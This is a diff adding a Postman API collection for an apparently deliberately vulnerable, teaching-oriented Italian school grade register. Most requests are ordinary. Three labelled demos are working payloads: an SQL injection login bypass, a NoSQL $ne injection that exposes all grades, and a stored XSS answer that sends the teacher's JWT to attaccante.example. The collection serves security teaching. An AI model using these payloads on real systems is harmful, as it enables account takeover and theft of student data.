@@ -1,0 +1,315 @@
+{
+  "info": {
+    "name": "ClasseMorta API",
+    "description": "Registro elettronico didattico. Importa in Postman, Apidog, Insomnia o Hoppscotch.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "https://classemorta-production.up.railway.app",
+      "description": "Sostituisci con il dominio del tuo backend (locale: http://localhost:8080)"
+    },
+    {
+      "key": "jwt",
+      "value": "",
+      "description": "Token JWT - viene salvato automaticamente dopo il login Studente o Professore"
+    }
+  ],
+  "auth": {
+    "type": "bearer",
+    "bearer": [{ "key": "token", "value": "{{jwt}}", "type": "string" }]
+  },
+  "item": [
+    {
+      "name": "Auth",
+      "item": [
+        {
+          "name": "Login - Professore",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data && data.token) {",
+                  "    pm.collectionVariables.set('jwt', data.token);",
+                  "    console.log('JWT salvato in variabile collezione');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "auth": { "type": "noauth" },
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"mario.rossi@scuola.it\",\n    \"password\": \"prof123\",\n    \"ruolo\": \"professore\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "login"]
+            }
+          }
+        },
+        {
+          "name": "Login - Studente",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const data = pm.response.json();",
+                  "if (data && data.token) {",
+                  "    pm.collectionVariables.set('jwt', data.token);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "request": {
+            "auth": { "type": "noauth" },
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"luca.verdi@studenti.it\",\n    \"password\": \"studente1\",\n    \"ruolo\": \"studente\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "login"]
+            }
+          }
+        },
+        {
+          "name": "Login - SQL Injection demo",
+          "request": {
+            "auth": { "type": "noauth" },
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"email\": \"' OR '1'='1' --\",\n    \"password\": \"qualsiasi\",\n    \"ruolo\": \"professore\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/login",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "login"]
+            }
+          }
+        },
+        {
+          "name": "Me - utente corrente",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/me",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "me"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Studenti & Classi",
+      "item": [
+        {
+          "name": "Lista classi (prof)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/classi",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "classi"]
+            }
+          }
+        },
+        {
+          "name": "Studenti per classe (prof)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/studenti?classe=5A",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "studenti"],
+              "query": [{ "key": "classe", "value": "5A" }]
+            }
+          }
+        },
+        {
+          "name": "Singolo studente (prof)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/studenti/1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "studenti", "1"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Voti",
+      "item": [
+        {
+          "name": "Voti di uno studente (prof)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/voti?studente_id=1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "voti"],
+              "query": [{ "key": "studente_id", "value": "1" }]
+            }
+          }
+        },
+        {
+          "name": "I miei voti (studente)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/voti/me",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "voti", "me"]
+            }
+          }
+        },
+        {
+          "name": "Voti - NoSQL injection demo",
+          "request": {
+            "method": "GET",
+            "description": "Payload didattico: studente_id[$ne]=null restituisce TUTTI i voti di tutti gli studenti, anche con un JWT da studente normale.",
+            "url": {
+              "raw": "{{baseUrl}}/api/voti?studente_id[$ne]=null",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "voti"],
+              "query": [{ "key": "studente_id[$ne]", "value": "null" }]
+            }
+          }
+        },
+        {
+          "name": "Crea voto (prof)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"studente_id\": 1,\n    \"materia\": \"Matematica\",\n    \"voto\": 7.5,\n    \"descrizione\": \"Interrogazione orale\"\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/voti",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "voti"]
+            }
+          }
+        },
+        {
+          "name": "Elimina voto (prof)",
+          "request": {
+            "method": "DELETE",
+            "url": {
+              "raw": "{{baseUrl}}/api/voti/SOSTITUISCI_OBJECTID",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "voti", "SOSTITUISCI_OBJECTID"]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Verifiche",
+      "item": [
+        {
+          "name": "Lista verifiche",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche"]
+            }
+          }
+        },
+        {
+          "name": "Dettaglio verifica",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche/1",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche", "1"]
+            }
+          }
+        },
+        {
+          "name": "Crea verifica (prof)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"classe\": \"5A\",\n    \"materia_id\": 1,\n    \"titolo\": \"Verifica del 12 maggio\",\n    \"descrizione\": \"Capitoli 4 e 5\",\n    \"domande\": [\n        \"Definisci il teorema di Pitagora\",\n        \"Risolvi l'equazione 2x + 5 = 13\"\n    ]\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche"]
+            }
+          }
+        },
+        {
+          "name": "Consegna risposte (studente)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"risposte\": {\n        \"1\": \"Risposta alla domanda 1\",\n        \"2\": \"Risposta alla domanda 2\"\n    }\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche/1/risposte",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche", "1", "risposte"]
+            }
+          }
+        },
+        {
+          "name": "Consegna risposte - XSS payload demo (studente)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "description": "Payload didattico: lo studente inserisce HTML/JS arbitrario che verrà eseguito dal professore quando aprirà la review.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"risposte\": {\n        \"1\": \"<img src=x onerror=\\\"fetch('https://attaccante.example/?t=' + localStorage.getItem('classemorta_jwt'))\\\">\"\n    }\n}"
+            },
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche/1/risposte",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche", "1", "risposte"]
+            }
+          }
+        },
+        {
+          "name": "Review risposte (prof)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{baseUrl}}/api/verifiche/1/risposte",
+              "host": ["{{baseUrl}}"],
+              "path": ["api", "verifiche", "1", "risposte"]
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
